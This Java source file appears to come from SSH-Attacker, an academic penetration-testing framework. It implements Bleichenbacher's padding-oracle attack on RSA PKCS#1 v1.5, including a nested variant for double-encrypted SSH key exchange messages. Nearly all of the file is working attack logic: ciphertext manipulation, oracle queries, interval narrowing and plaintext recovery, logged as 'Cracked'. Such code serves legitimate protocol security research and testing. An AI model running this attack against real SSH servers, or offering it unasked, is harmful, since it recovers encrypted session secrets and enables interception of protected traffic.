/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2023 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.pkcs1;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
import java.math.BigInteger;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Bleichenbacher extends Pkcs1Attack {

    private static final Logger LOGGER = LogManager.getLogger();
    CustomRsaPublicKey hostPublicKey;
    CustomRsaPublicKey serverPublicKey;

    private final BigInteger big_two = BigInteger.valueOf(2);

    private BigInteger B = null;
    private BigInteger two_B = null;
    private BigInteger three_B = null;
    private BigInteger three_B_sub_one = null;
    private BigInteger three_B_plus_one = null;

    private int counterInnerBleichenbacher;
    private int counterOuterBleichenbacher;

    /**
     * @param msg The message that should be decrypted with the attack
     * @param pkcsOracle The oracle to be queried
     */
    public Bleichenbacher(
            byte[] msg,
            Pkcs1Oracle pkcsOracle,
            CustomRsaPublicKey hostPublicKey,
            CustomRsaPublicKey serverPublicKey) {
        super(msg, pkcsOracle);
        this.hostPublicKey = hostPublicKey;
        this.serverPublicKey = serverPublicKey;
        counterInnerBleichenbacher = 0;
        counterOuterBleichenbacher = 0;
    }

    /**
     * Calculates the floor division of two BigInteger numbers.
     *
     * @param a The BigInteger number to be divided.
     * @param b The BigInteger number that is the divisor.
     * @return The floor division of a by b as a BigInteger.
     */
    private BigInteger floor(BigInteger a, BigInteger b) {
        return a.divide(b);
    }

    /**
     * Divides a BigInteger number 'a' by another BigInteger number 'b' and returns the ceiling of
     * the result.
     *
     * @param a The BigInteger number to be divided
     * @param b The BigInteger number that is the divisor
     * @return The ceiling of the division result
     */
    private BigInteger ceil(BigInteger a, BigInteger b) {
        BigInteger c = a.mod(b);
        if (c.compareTo(BigInteger.ZERO) > 0) {
            return a.divide(b).add(BigInteger.ONE);
        } else {
            return a.divide(b);
        }
    }

    /**
     * Manipulates the ciphertext by performing the following steps: 1. Computes the exponentiated
     * value of s using the public exponent e and modulus n. 2. Converts the ciphertext array c to a
     * BigInteger cipher. 3. Multiplies cipher with exponentiated and stores the result in res. 4.
     * Computes the modulus of res with n and returns the result.
     *
     * @param s The value to be exponentiated.
     * @param e The public exponent.
     * @param n The modulus.
     * @param c The ciphertext as a byte array.
     * @return The manipulated ciphertext as a BigInteger.
     */
    private BigInteger manipulateCiphertext(BigInteger s, BigInteger e, BigInteger n, byte[] c) {
        BigInteger exponentiated = s.modPow(e, n);
        BigInteger cipher = new BigInteger(1, c);
        BigInteger res = cipher.multiply(exponentiated);

        return res.mod(n);
    }

    /**
     * Searches the smallest suitable s-value for the BB-Attack
     *
     * @param lowerBound The smallest value where it makes sens to start searching
     * @param ciphertext the ciphertext which should be checked against
     * @param rsaPublicKey the public-key to the ciphertext, which should be used to encrypt
     * @return the smallest s-value, which generates a valid PKCS#1 Ciphertext
     */
    private BigInteger find_smallest_s(
            BigInteger lowerBound, byte[] ciphertext, CustomRsaPublicKey rsaPublicKey) {
        BigInteger s = lowerBound;
        LOGGER.debug("Searching for smallest s, beginning at: {}", lowerBound.toString(16));
        LOGGER.debug("Ciphertext: {} ", bytesToHex(ciphertext));

        while (true) {
            // (c * pow(s,e,n)) % n
            /*            BigInteger exponentiated =
                    s.modPow(rsaPublicKey.getPublicExponent(), rsaPublicKey.getModulus());
            BigInteger cipher = new BigInteger(1, ciphertext);
            BigInteger res = cipher.multiply(exponentiated);
            BigInteger attempt = res.mod(rsaPublicKey.getModulus());
            */

            BigInteger attempt =
                    manipulateCiphertext(
                            s,
                            rsaPublicKey.getPublicExponent(),
                            rsaPublicKey.getModulus(),
                            ciphertext);

            boolean oracleResult = queryOracle(attempt, false);

            if (counterOuterBleichenbacher == 0) {
                LOGGER.fatal(
                        ArrayConverter.bytesToHexString(
                                ArrayConverter.bigIntegerToByteArray(attempt)));
            }
            counterOuterBleichenbacher++;

            if (oracleResult) {
                LOGGER.fatal(
                        ArrayConverter.bytesToHexString(
                                ArrayConverter.bigIntegerToByteArray(attempt)));
                // System.exit(0);
                return s;
            }
            s = s.add(BigInteger.ONE);
        }
    }

    /**
     * Searches the smallest suitable s-value for the inner encryption of a nested (double
     * encrypted) BB-Attack.
     *
     * @param lowerBound The smallest value where it makes sens to start searching
     * @param ciphertext the ciphertext which should be checked against
     * @param rsaPublicKey the public-key to the ciphertext, which should be used to encrypt
     * @param outerKey the rsa-public-key for the outer encryption, encrypting the generated s-value
     * @return the smallest s-value, which generates a valid PKCS#1 Ciphertext
     */
    private BigInteger find_smallest_s_nested(
            BigInteger lowerBound,
            byte[] ciphertext,
            CustomRsaPublicKey rsaPublicKey,
            CustomRsaPublicKey outerKey) {
        BigInteger s = lowerBound;
        // LOGGER.debug("Searching for smallest s, beginning at: {}", lowerBound.toString(16));
        // LOGGER.debug("Ciphertext: {}", bytesToHex(ciphertext));

        while (true) {
            // (c * pow(s,e,n)) % n
            BigInteger attempt =
                    manipulateCiphertext(
                            s,
                            rsaPublicKey.getPublicExponent(),
                            rsaPublicKey.getModulus(),
                            ciphertext);

            BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);

            boolean oracleResult = queryOracle(encryptedAttempt, true);
            counterInnerBleichenbacher++;

            if (oracleResult) {
                LOGGER.fatal(
                        ArrayConverter.bytesToHexString(
                                ArrayConverter.bigIntegerToByteArray(encryptedAttempt)));
                LOGGER.debug("Found smallest s: {}", s);
                return s;
            }

            s = s.add(BigInteger.ONE);
        }
    }

    /**
     * Searches for a valid s-value in a given range of possible s-values for the inner encryption
     * of a nested (double encrypted) BB-Attack
     *
     * @param lowerBound the lower bound for the possible s-values
     * @param upperBound the upper boud for the possible s-values
     * @param previousS the last s which was found,
     * @param ciphertext the ciphertext, for which the s-values should be found
     * @param rsaPublicKey the public-key for which the s-values should be found
     * @param outerKey the outer encryption key
     * @return
     */
    private BigInteger find_s_in_range_nested(
            BigInteger lowerBound,
            BigInteger upperBound,
            BigInteger previousS,
            byte[] ciphertext,
            CustomRsaPublicKey rsaPublicKey,
            CustomRsaPublicKey outerKey) {
        /*      LOGGER.debug(
        "Searching for s in range from {} to {}",
        lowerBound.toString(16),
        upperBound.toString(16));*/

        //  ri = ceil(2 * (b * prev_s - 2 * B), n)
        BigInteger bTimesPrevs = upperBound.multiply(previousS);
        BigInteger bTimePrevsSubTwoB = bTimesPrevs.subtract(two_B);
        BigInteger ri = ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());

        while (true) {

            // si_lower = ceil(2 * B + ri * n, b)
            // si_upper = ceil(3 * B + ri * n, a)
            BigInteger rITimesN = ri.multiply(rsaPublicKey.getModulus());
            BigInteger si_lower = ceil(two_B.add(rITimesN), upperBound);
            BigInteger si_upper = ceil(three_B.add(rITimesN), lowerBound);

            for (BigInteger si = si_lower;
                    si.compareTo(si_upper) < 0;
                    si = si.add(BigInteger.ONE)) {

                // (c * pow(si, e, n)) % n
                /*                BigInteger exponentiated =
                        si.modPow(rsaPublicKey.getPublicExponent(), rsaPublicKey.getModulus());
                BigInteger cipher = new BigInteger(1, ciphertext);
                BigInteger res = cipher.multiply(exponentiated);
                BigInteger attempt = res.mod(rsaPublicKey.getModulus());*/

                BigInteger attempt =
                        manipulateCiphertext(
                                si,
                                rsaPublicKey.getPublicExponent(),
                                rsaPublicKey.getModulus(),
                                ciphertext);

                BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
                boolean oracleResult = queryOracle(encryptedAttempt, true);
                counterInnerBleichenbacher++;

                if (oracleResult) {
                    return si;
                }
            }

            ri = ri.add(BigInteger.ONE);
        }
    }

    /**
     * Searches for a valid s-value in a given range of possible s-values of a BB-Attack
     *
     * @param lowerBound the lower bound for the possible s-values
     * @param upperBound the upper boud for the possible s-values
     * @param previousS the last s which was found,
     * @param ciphertext the ciphertext, for which the s-values should be found
     * @param rsaPublicKey the public-key for which the s-values should be found
     * @return
     */
    private BigInteger find_s_in_range(
            BigInteger lowerBound,
            BigInteger upperBound,
            BigInteger previousS,
            byte[] ciphertext,
            CustomRsaPublicKey rsaPublicKey) {
        /*
                LOGGER.debug(
                        "Searching for s in range from {} to {}",
                        lowerBound.toString(16),
                        upperBound.toString(16));
        */

        //  ri = ceil(2 * (b * prev_s - 2 * B), n)
        BigInteger bTimesPrevs = upperBound.multiply(previousS);
        BigInteger bTimePrevsSubTwoB = bTimesPrevs.subtract(two_B);
        BigInteger ri = ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());

        while (true) {

            // si_lower = ceil(2 * B + ri * n, b)
            // si_upper = ceil(3 * B + ri * n, a)
            BigInteger rITimesN = ri.multiply(rsaPublicKey.getModulus());
            BigInteger si_lower = ceil(two_B.add(rITimesN), upperBound);
            BigInteger si_upper = ceil(three_B.add(rITimesN), lowerBound);

            for (BigInteger si = si_lower;
                    si.compareTo(si_upper) < 0;
                    si = si.add(BigInteger.ONE)) {

                // (c * pow(si, e, n)) % n
                /*                BigInteger exponentiated =
                        si.modPow(rsaPublicKey.getPublicExponent(), rsaPublicKey.getModulus());
                BigInteger cipher = new BigInteger(1, ciphertext);
                BigInteger res = cipher.multiply(exponentiated);
                BigInteger attempt = res.mod(rsaPublicKey.getModulus());*/

                BigInteger attempt =
                        manipulateCiphertext(
                                si,
                                rsaPublicKey.getPublicExponent(),
                                rsaPublicKey.getModulus(),
                                ciphertext);

                boolean oracleResult = queryOracle(attempt, false);
                counterOuterBleichenbacher++;

                if (oracleResult) {
                    return si;
                }
            }
            ri = ri.add(BigInteger.ONE);
        }
    }

    /**
     * Inserts a newly found interval into the known intervals M at the correct position
     *
     * @param M the known intervals of the previous attack-steps
     * @param intervalToInsert the newly found interval, which should be inserted
     * @return
     */
    static List<Interval> safeIntervalInsert(List<Interval> M, Interval intervalToInsert) {
        for (int i = 0; i < M.size(); i++) {
            Interval chosenInterval = M.get(i);

            if (chosenInterval.upper.compareTo(intervalToInsert.lower) >= 0
                    && chosenInterval.lower.compareTo(intervalToInsert.upper) <= 0) {
                BigInteger lb = chosenInterval.lower.min(intervalToInsert.lower);
                BigInteger ub = chosenInterval.upper.max(intervalToInsert.upper);
                M.set(i, new Interval(lb, ub));
                /*                LOGGER.debug(
                "Overlap found, inserting lowerBound: {} upperboudn: {} into new M [{}] = {}",
                lb.toString(16),
                ub.toString(16),
                i,
                M.toString());*/
                return M;
            }
        }

        M.add(intervalToInsert);
        return M;
    }

    /**
     * Searches for the next intervals given by the found s-value for the BB-Attack
     *
     * @param M the previoud found Intervals
     * @param s the found s-value which generates a valid PCKS-Padding
     * @param rsaPublicKey the public key, for which the ciphertext should be decrypted
     * @return
     */
    private List<Interval> updateInterval(
            List<Interval> M, BigInteger s, CustomRsaPublicKey rsaPublicKey) {
        List<Interval> M_new = new ArrayList<>();
        for (Interval chosenInterval : M) {
            /*
                a * s - 3 * B + 1
            */
            BigInteger lowerTimesS = chosenInterval.lower.multiply(s);
            BigInteger lowerPartForCeil = lowerTimesS.subtract(three_B_plus_one);

            BigInteger r_lower = ceil(lowerPartForCeil, rsaPublicKey.getModulus());

            /*           LOGGER.debug(
                                "found r_lower: {} from lowerPartForCeil: {}",
                                r_lower.toString(16),
                                lowerPartForCeil.toString(16));
            */
            /*
                b * s - 2 * B
            */
            BigInteger upperTimesS = chosenInterval.upper.multiply(s);
            BigInteger upperPartForCeil = upperTimesS.subtract(two_B);
            BigInteger r_upper = ceil(upperPartForCeil, rsaPublicKey.getModulus());
            /*
                        LOGGER.debug(
                                "found r_upper: {} from upperPartForCeil: {}",
                                r_upper.toString(16),
                                upperPartForCeil.toString(16));

                        LOGGER.debug("Compare:{}", r_lower.compareTo(r_upper));
            */

            for (BigInteger r = r_lower; r.compareTo(r_upper) < 0; r = r.add(BigInteger.ONE)) {
                BigInteger lowerBound = chosenInterval.lower;
                BigInteger upperBound = chosenInterval.upper;

                BigInteger lowerUpperBound =
                        ceil(two_B.add(r.multiply(rsaPublicKey.getModulus())), s);
                lowerBound = lowerBound.max(lowerUpperBound);
                // LOGGER.debug("found lowerBound: {}", lowerBound.toString(16));

                BigInteger upperUpperBound =
                        floor(three_B_sub_one.add(r.multiply(rsaPublicKey.getModulus())), s);
                upperBound = upperBound.min(upperUpperBound);
                // LOGGER.debug("found upperBound: {}", upperBound.toString(16));

                Interval interim_interval = new Interval(lowerBound, upperBound);
                /*LOGGER.debug(
                                        "new Interval to insert lower: {} upper: {}",
                                        interim_interval.lower.toString(16),
                                        interim_interval.upper.toString(16));
                */
                M_new = safeIntervalInsert(M_new, interim_interval);
                /*LOGGER.debug(
                "safeinserting in M_new lower: {} M upper: {}",
                M_new.get(0).lower.toString(16),
                M_new.get(0).upper.toString(16));*/
            }
        }

        return M_new;
    }

    /** The function to start the Attack */
    public void attack() {

        if (hostPublicKey.getModulus().bitLength() > serverPublicKey.getModulus().bitLength()) {
            byte[] cracked =
                    nestedBleichenbacher(encryptedMsg, this.serverPublicKey, this.hostPublicKey);
            LOGGER.info("Cracked encoded: {}", ArrayConverter.bytesToHexString(cracked));
            byte[] cracked_decoded = pkcs1Decode(cracked);
            LOGGER.info("Cracked decoded: {}", ArrayConverter.bytesToHexString(cracked_decoded));
            solution = new BigInteger(cracked_decoded);
        } else {
            byte[] cracked =
                    nestedBleichenbacher(encryptedMsg, this.serverPublicKey, this.hostPublicKey);
            LOGGER.info("Cracked encoded: {}", ArrayConverter.bytesToHexString(cracked));
            byte[] cracked_decoded = pkcs1Decode(cracked);
            LOGGER.info("Cracked decoded: {}", ArrayConverter.bytesToHexString(cracked_decoded));
            solution = new BigInteger(cracked_decoded);
        }
    }

    /**
     * The Bleichenbacher-Attack for a nested encryption. The Encryption is: (outerkey ( innerkey (
     * ciphertext)))
     *
     * @param ciphertext The Ciphertext, which should be decrypted
     * @param innerPublicKey The known public key, for the inner encryption for the ciphertext
     * @param outerPublicKey The known public key, for the outer encryption for the ciphertext
     * @return
     */
    private byte[] nestedBleichenbacher(
            byte[] ciphertext,
            CustomRsaPublicKey innerPublicKey,
            CustomRsaPublicKey outerPublicKey) {
        int innerBitsize = innerPublicKey.getModulus().bitLength();
        int outerBitsize = outerPublicKey.getModulus().bitLength();
        int innerK = innerBitsize / 8;
        int outerK = outerBitsize / 8;

        B = big_two.pow(8 * (outerK - 2));
        two_B = B.multiply(big_two);
        three_B = B.multiply(BigInteger.valueOf(3));
        three_B_sub_one = three_B.subtract(BigInteger.ONE);
        three_B_plus_one = three_B.add(BigInteger.ONE);

        // LOGGER.debug("Starting with outer BB {} ", ArrayConverter.bytesToHexString(ciphertext));
        byte[] encoded_inner_ciphertext = bleichenbacher(ciphertext, outerPublicKey);
        // LOGGER.debug("got inner BB {}", ArrayConverter.bytesToHexString(ciphertext));
        byte[] innerCiphertext = pkcs1Decode(encoded_inner_ciphertext);
        // LOGGER.debug("Decoded inner BB into {}",
        // ArrayConverter.bytesToHexString(innerCiphertext));

        // LOGGER.debug("Switching to inner Ciphertext, cracked outer successful");

        B = big_two.pow(8 * (innerK - 2));
        two_B = B.multiply(big_two);
        three_B = B.multiply(BigInteger.valueOf(3));
        three_B_sub_one = three_B.subtract(BigInteger.ONE);
        three_B_plus_one = three_B.add(BigInteger.ONE);

        return innerBleichenbacher(innerCiphertext, innerPublicKey, outerPublicKey);
    }

    /**
     * Perform the inner Bleichenbacher algorithm.
     *
     * @param ciphertext The ciphertext to decrypt.
     * @param innerPublicKey The inner RSA public key.
     * @param outerPublicKey The outer RSA public key.
     * @return The decrypted plaintext as a byte array.
     */
    private byte[] innerBleichenbacher(
            byte[] ciphertext,
            CustomRsaPublicKey innerPublicKey,
            CustomRsaPublicKey outerPublicKey) {

        int innerBitsize = innerPublicKey.getModulus().bitLength();
        int innerK = innerBitsize / 8;

        LOGGER.debug(
                "bitsize: {}\nk: {}\nB: {}\n2B: {}\n3B: {}\n3B - 1: {}\nCiphertext: {}",
                innerBitsize,
                innerK,
                B.toString(16),
                two_B.toString(16),
                three_B.toString(16),
                three_B_sub_one.toString(16),
                bytesToHex(ciphertext));

        List<Interval> M = new ArrayList<>();
        M.add(new Interval(two_B, three_B_sub_one));
        LOGGER.debug(
                "M lower: {} M upper: {}",
                M.get(0).lower.toString(16),
                M.get(0).upper.toString(16));

        ArrayList<int[]> trimmers = new ArrayList<>();
        for (int t = 2; t <= Math.pow(2, 12) + 1; t++) {
            if (t <= 50) {
                for (int u = Math.floorDiv(2 * t, 3); u <= Math.floorDiv(3 * t, 2); u++) {
                    if (BigInteger.valueOf(u).gcd(BigInteger.valueOf(t)).equals(BigInteger.ONE)) {
                        trimmers.add(new int[] {u, t});
                    }
                }
            } else { // t > 50
                trimmers.add(new int[] {t - 1, t});
                trimmers.add(new int[] {t + 1, t});
            }
        }
        ArrayList<int[]> utPairs = new ArrayList<>();

        for (int[] ut : trimmers) {
            int u = ut[0];
            int t = ut[1];

            BigInteger uBI = BigInteger.valueOf(u);
            BigInteger tBI = BigInteger.valueOf(t);

            BigInteger cipherbig = new BigInteger(1, ciphertext);

            BigInteger result =
                    cipherbig
                            .multiply(
                                    (uBI.multiply(tBI.modInverse(innerPublicKey.getModulus())))
                                            .modPow(
                                                    innerPublicKey.getPublicExponent(),
                                                    innerPublicKey.getModulus()))
                            .mod(innerPublicKey.getModulus());

            BigInteger encryptedAttempt = encryptBigInt(result, outerPublicKey);

            if (queryOracle(
                    encryptedAttempt,
                    true)) { // assuming the oracle and util method exists and does what expected
                utPairs.add(new int[] {u, t});
            }
        }

        if (!utPairs.isEmpty()) {

            ArrayList<Integer> t_values = new ArrayList<>();
            for (int[] pair : utPairs) {
                t_values.add(pair[1]);
            }

            int t_prime = lcm_n(t_values);

            int u_min = Integer.MAX_VALUE;
            int u_max = Integer.MIN_VALUE;
            for (int[] pair : utPairs) {
                int current = pair[0] * t_prime / pair[1];
                if (current < u_min) {
                    u_min = current;
                }
                if (current > u_max) {
                    u_max = current;
                }
            }

            BigInteger a =
                    two_B.multiply(BigInteger.valueOf(t_prime)).divide(BigInteger.valueOf(u_min));
            BigInteger b =
                    three_B_sub_one
                            .multiply(BigInteger.valueOf(t_prime))
                            .divide(BigInteger.valueOf(u_max));

            M = new ArrayList<>();
            M.add(new Interval(a, b));
            LOGGER.debug("done. trimming M0 iterations: [{},{}]", a, b);
        } else {
            LOGGER.debug("UT-Paris where empty");
        }

        BigInteger s =
                find_smallest_s_nested(
                        ceil(innerPublicKey.getModulus().add(two_B), M.get(0).lower),
                        ciphertext,
                        innerPublicKey,
                        outerPublicKey);

        LOGGER.debug(
                "found s, initial updating M lower: {} M upper: {}",
                M.get(0).lower.toString(16),
                M.get(0).upper.toString(16));

        M = updateInterval(M, s, innerPublicKey);
        LOGGER.debug("Length: {} M: {}", M.size(), M.toString());

        while (true) {
            if (M.size() >= 2) {
                s =
                        find_smallest_s_nested(
                                s.add(BigInteger.ONE), ciphertext, innerPublicKey, outerPublicKey);
            } else if (M.size() == 1) {
                BigInteger a = M.get(0).lower;
                BigInteger b = M.get(0).upper;
                if (a.equals(b)) {
                    return ArrayConverter.bigIntegerToByteArray(a);
                }
                s = find_s_in_range_nested(a, b, s, ciphertext, innerPublicKey, outerPublicKey);
            }
            M = updateInterval(M, s, innerPublicKey);
        }
    }

    // Define the lcm method
    public static int lcm(int a, int b) {
        int tempA = a;
        int tempB = b;
        while (tempB != 0) {
            int temp = tempB;
            tempB = tempA % tempB;
            tempA = temp;
        }
        return a * (b / tempA);
    }

    // Define the lcm_n method
    public static int lcm_n(ArrayList<Integer> list) {
        ArrayList<Integer> ns = new ArrayList<>(list);
        int log = (int) (Math.log(ns.size()) / Math.log(2) + 1);
        for (int i = 0; i < log; i++) {
            ArrayList<Integer> finalNs = ns;
            List<Integer> nsNext =
                    IntStream.range(0, ns.size() / 2)
                            .mapToObj(k -> lcm(finalNs.get(2 * k), finalNs.get(2 * k + 1)))
                            .collect(Collectors.toList());
            if (ns.size() % 2 != 0) {
                nsNext.add(ns.get(ns.size() - 1));
            }
            ns = new ArrayList<>(nsNext);
        }
        return ns.get(0);
    }

    /**
     * The Bleichenbacher-Attacke for single-encrypted ciphertexts
     *
     * @param ciphertext The ciphertext, which should be decrypted
     * @param publicKey The known public key, which was used to encrypt the ciphertext
     * @return the decrypted ciphertext, whith a valid PKCS#1 Padding
     */
    private byte[] bleichenbacher(byte[] ciphertext, CustomRsaPublicKey publicKey) {
        int bitsize = publicKey.getModulus().bitLength();
        int k = bitsize / 8;

        LOGGER.debug(
                "bitsize: {}\nk: {}\nB: {}\n2B: {}\n3B: {}\n3B - 1: {}\nCiphertext: {}",
                bitsize,
                k,
                B.toString(16),
                two_B.toString(16),
                three_B.toString(16),
                three_B_sub_one.toString(16),
                bytesToHex(ciphertext));

        List<Interval> M = new ArrayList<>();
        M.add(new Interval(two_B, three_B_sub_one));
        LOGGER.debug(
                "M lower: {} M upper: {}",
                M.get(0).lower.toString(16),
                M.get(0).upper.toString(16));

        ArrayList<int[]> trimmers = new ArrayList<>();
        for (int t = 2; t <= Math.pow(2, 12) + 1; t++) {
            if (t <= 50) {
                for (int u = Math.floorDiv(2 * t, 3); u <= Math.floorDiv(3 * t, 2); u++) {
                    if (BigInteger.valueOf(u).gcd(BigInteger.valueOf(t)).equals(BigInteger.ONE)) {
                        trimmers.add(new int[] {u, t});
                    }
                }
            } else { // t > 50
                trimmers.add(new int[] {t - 1, t});
                trimmers.add(new int[] {t + 1, t});
            }
        }
        ArrayList<int[]> utPairs = new ArrayList<>();

        for (int[] ut : trimmers) {
            int u = ut[0];
            int t = ut[1];

            BigInteger uBI = BigInteger.valueOf(u);
            BigInteger tBI = BigInteger.valueOf(t);

            BigInteger cipherbig = new BigInteger(1, ciphertext);

            BigInteger result =
                    cipherbig
                            .multiply(
                                    (uBI.multiply(tBI.modInverse(publicKey.getModulus())))
                                            .modPow(
                                                    publicKey.getPublicExponent(),
                                                    publicKey.getModulus()))
                            .mod(publicKey.getModulus());

            if (queryOracle(
                    result,
                    false)) { // assuming the oracle and util method exists and does what expected
                utPairs.add(new int[] {u, t});
            }
        }

        if (!utPairs.isEmpty()) {

            ArrayList<Integer> t_values = new ArrayList<>();
            for (int[] pair : utPairs) {
                t_values.add(pair[1]);
            }

            int t_prime = lcm_n(t_values);

            int u_min = Integer.MAX_VALUE;
            int u_max = Integer.MIN_VALUE;
            for (int[] pair : utPairs) {
                int current = pair[0] * t_prime / pair[1];
                if (current < u_min) {
                    u_min = current;
                }
                if (current > u_max) {
                    u_max = current;
                }
            }

            BigInteger a =
                    two_B.multiply(BigInteger.valueOf(t_prime)).divide(BigInteger.valueOf(u_min));
            BigInteger b =
                    three_B_sub_one
                            .multiply(BigInteger.valueOf(t_prime))
                            .divide(BigInteger.valueOf(u_max));

            M = new ArrayList<>();
            M.add(new Interval(a, b));
            LOGGER.debug("done. trimming M0 iterations: [{},{}]", a, b);
        } else {
            LOGGER.debug("UT-Paris where empty");
        }

        BigInteger s =
                find_smallest_s(
                        ceil(publicKey.getModulus().add(two_B), M.get(0).lower),
                        ciphertext,
                        publicKey);

        LOGGER.debug(
                "found s, initial updating M lower: {} M upper: {}",
                M.get(0).lower.toString(16),
                M.get(0).upper.toString(16));

        M = updateInterval(M, s, publicKey);
        LOGGER.debug("Length: {} M: {}", M.size(), M.toString());

        while (true) {
            if (M.size() >= 2) {
                s = find_smallest_s(s.add(BigInteger.ONE), ciphertext, publicKey);
            } else if (M.size() == 1) {
                BigInteger a = M.get(0).lower;
                BigInteger b = M.get(0).upper;
                if (a.equals(b)) {
                    return ArrayConverter.bigIntegerToByteArray(a);
                }
                s = find_s_in_range(a, b, s, ciphertext, publicKey);
            }
            M = updateInterval(M, s, publicKey);
        }
    }

    /**
     * A helper function to create a hex-string from bytes
     *
     * @param bytes The bytes, which should be returned as hex-string
     * @return The hex-string for the given Bytes
     */
    private String bytesToHex(byte[] bytes) {
        StringBuilder result = new StringBuilder();
        for (byte b : bytes) {
            result.append(String.format("%02x", b));
        }
        return result.toString();
    }

    /**
     * A helper function to remove a PKCS#1-encoded-Padding
     *
     * @param encodedPayload The PKCS#1-encoded Payload
     * @return The raw payload, without padding and header.
     */
    private byte[] pkcs1Decode(byte[] encodedPayload) {
        /*
            This function removes the header and the padding from the PKCS#1 v1.5
            Encoding Scheme
        */
        encodedPayload = Arrays.copyOfRange(encodedPayload, 2, encodedPayload.length);

        int idx = 0;
        for (int i = 0; i < encodedPayload.length; i++) {
            if (encodedPayload[i] == 0x00) {
                idx = i;
                break;
            }
        }

        if (idx != 0) {
            idx = idx + 1;
        }

        return Arrays.copyOfRange(encodedPayload, idx, encodedPayload.length);
    }

    /**
     * A helper function to encrypt a given BB-Attempt with a PCKS#1-Padding and a RSA encryption
     *
     * @param attempt The "plain" BB-Attempt, which should be encrypted
     * @param encryptionKey The encryption-Key for the attempt
     * @return
     */
    private BigInteger encryptBigInt(BigInteger attempt, CustomRsaPublicKey encryptionKey) {
        try {
            Cipher javaCipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");

            javaCipher.init(Cipher.ENCRYPT_MODE, encryptionKey);

            return new BigInteger(
                    javaCipher.doFinal(ArrayConverter.bigIntegerToByteArray(attempt)));

        } catch (InvalidKeyException
                | IllegalBlockSizeException
                | BadPaddingException
                | NoSuchPaddingException
                | NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
    }

    public int getCounterInnerBleichenbacher() {
        return counterInnerBleichenbacher;
    }

    public void setCounterInnerBleichenbacher(int counterInnerBleichenbacher) {
        this.counterInnerBleichenbacher = counterInnerBleichenbacher;
    }

    public int getCounterOuterBleichenbacher() {
        return counterOuterBleichenbacher;
    }

    public void setCounterOuterBleichenbacher(int counterOuterBleichenbacher) {
        this.counterOuterBleichenbacher = counterOuterBleichenbacher;
    }
}
